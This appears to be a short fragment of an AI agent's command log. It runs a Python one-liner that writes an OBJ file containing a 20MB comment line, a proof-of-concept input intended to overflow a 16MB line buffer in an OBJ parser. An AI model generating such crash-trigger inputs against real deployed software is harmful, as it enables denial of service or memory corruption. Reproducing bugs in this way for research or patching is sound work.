Running command: # Create an OBJ file with a very long comment line (> 16MB)
# The OBJ parser will call getNextDataLine which calls getNextLine internally
# A comment line starting with '#' will be processed
python3 -c "
import sys
# Create a file with a very long line
# The default cache is 4096*4096 = 16MB
# We need a line longer than 16MB to trigger the overflow
line_size = 20 * 1024 * 1024  # 20MB line
with open('/workspace/poc.obj', 'wb') as f:
    f.write(b'# ' + b'A' * line_size + b'\n')
print(f'Created poc.obj with {line_size + 3} bytes')
"
